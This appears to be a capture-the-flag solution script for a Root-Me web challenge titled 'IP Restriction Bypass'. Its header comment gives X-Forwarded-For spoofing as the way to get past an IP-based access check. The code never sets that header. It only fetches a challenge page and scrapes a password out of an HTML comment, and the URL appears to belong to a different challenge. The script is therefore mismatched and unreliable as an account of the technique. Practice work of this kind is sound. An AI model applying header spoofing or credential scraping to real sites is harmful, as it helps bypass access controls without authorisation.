# 68 - IP Restriction Bypass
# Solution: Add the header `X-Forwarded-For` with the value of the IP address to bypass the IP restriction.

import requests
from bs4 import BeautifulSoup, Comment

url = "http://challenge01.root-me.org/web-serveur/ch1/"
response = requests.get(url)
# print(response.text)

soup = BeautifulSoup(response.content, 'html.parser')
comments = soup.find_all(string=lambda text: isinstance(text, Comment))
flag = comments[-1].split("password :")[-1].strip()

print(flag)